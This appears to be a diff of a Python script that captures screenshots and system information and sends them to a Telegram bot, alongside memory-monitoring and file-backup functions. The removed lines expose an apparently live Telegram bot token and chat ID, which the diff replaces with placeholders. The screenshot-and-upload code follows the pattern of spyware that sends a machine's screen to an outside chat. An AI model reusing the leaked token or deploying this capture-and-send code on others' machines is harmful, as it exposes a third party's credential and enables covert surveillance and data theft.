@@ -9,19 +9,20 @@ import platform
 import requests
 import socket
 import subprocess
-from PIL import ImageGrab  # Use Pillow for screenshot capturing (ImageGrab for Windows)
+from PIL import ImageGrab  
 
 
-# Define the Telegram Bot Token and Chat ID
-bot_token = '7999167399:AAHmmLTlADYYatlbpxH2uQgjnKNlBDc0Xwo'
-chat_id = '5063829177'
+# Telegram style example
+#Token and Chat ID
+bot_token = 'Your token'
+chat_id = 'Your Chat ID'
 
 # Function to send the screenshot
 def send_screenshot():
     screenshot = pyautogui.screenshot()
     screenshot.save('screenshot.png')
     
-    url = f'https://api.telegram.org/bot7999167399:AAHmmLTlADYYatlbpxH2uQgjnKNlBDc0Xwo/sendPhoto'
+    url = f'https://api.telegram.org/your telegram bot api here/sendPhoto'
     
     # Send the screenshot to the chat
     with open('screenshot.png', 'rb') as photo:
@@ -149,7 +150,7 @@ def get_system_info():
 
 # Function to send message to Telegram bot
 def send_message(message):
-    url = f'https://api.telegram.org/bot7999167399:AAHmmLTlADYYatlbpxH2uQgjnKNlBDc0Xwo/sendMessage'
+    url = f'https://api.telegram.org/your telegram bot api here/sendMessage'
     response = requests.post(url, data={'chat_id': chat_id, 'text': message})
     
     if response.status_code == 200:
@@ -182,7 +183,7 @@ def monitor_system_health():
         print(f"Warning: High Memory Usage - {memory_usage}%")
 
 def backup_files():
-    source_dir = "C:/Users/user/Documents"  # Example source directory
+    source_dir = "C:/User/Documents"  # Example source directory
     backup_dir = f"C:/Backups/Backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
     
     if not os.path.exists(backup_dir):
